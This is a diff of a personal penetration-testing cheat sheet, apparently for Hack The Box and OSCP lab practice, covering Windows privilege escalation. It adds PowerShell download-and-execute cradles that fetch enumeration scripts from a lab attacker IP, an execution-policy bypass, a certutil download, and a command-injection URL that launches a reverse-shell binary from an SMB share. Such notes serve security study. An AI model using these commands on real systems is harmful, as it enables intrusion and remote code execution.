@@ -1,7 +1,6 @@
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
 HTB writeups machines --> https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/
-nishang is a Offensive PowerShell for red team
-- https://github.com/samratashok/nishang
+powershell scripts --> https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
 - the appropriate msfvenom payload for each webserver. you need to check the framework from wappalyzer
 -     https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 ------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
@@ -262,13 +261,16 @@ Windows Enumeration:
          - Watson.exe (compile)
          - SharpUp.exe (compile)
      Powershell:
-         - Sherlock.ps1
+         - Sherlock.ps1 //recommend a kernel exploitation
          - PowerUp.ps1 //recommended
          - jaws-enum.ps1
      Others:
          - Windows-exploit-suggester-python3 (local) //recommended
          - Exploit Suggester (Metasploit)
-  
+- sherlock usage:
+add Find-AllVulns in the last line
+-     echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/Sherlock.ps1') | powershell -noprofile - #download & execute
+
 - Windows-exploit-suggester usage:
   1- run 'systeminfo' and save it into a <sysinfo.txt>
   2- download and extract the tool from Git Hub.
@@ -345,7 +347,7 @@ if the AV is enabled you can execute commands from the SMB server
 setup a smbserver
 -     impacket-smbserver raman `pwd`
 generate msfvenom payload and execute the command
--     http://login.php?cmd= /c "10.10.16.6\raman\reverse.exe" #don't forget the URL encoding
+-     http://login.php?cmd=cmd /c "10.10.16.6\raman\reverse.exe" #don't forget the URL encoding
 
 Copy a file from Windows to Linux by setting up SMB server
 setup a smbserver
@@ -691,8 +693,9 @@ F> Full access | M> Modify access |RX> Read and execute access| R>Read-only acce
  Automated Tools
 Powerup     In the last line type Invoke-AllChecks
 -     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
-powershell -ep bypass .\PowerUp.ps1
-Invoke-AllChecks (check all possible vulnerability except plaintext passwd)
+powershell -ep bypass .\PowerUp.ps1     OR
+powershell -ep bypass | Invoke-AllChecks (check all possible vulnerability except plaintext passwd)     OR
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/PowerUp.ps1') | powershell -noprofile -   #download and execute (working)
 Winpeas.exe (all including plaintext passwd)
 Windpeas.exe If .net 4.5 (run otherwise)
 -     certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
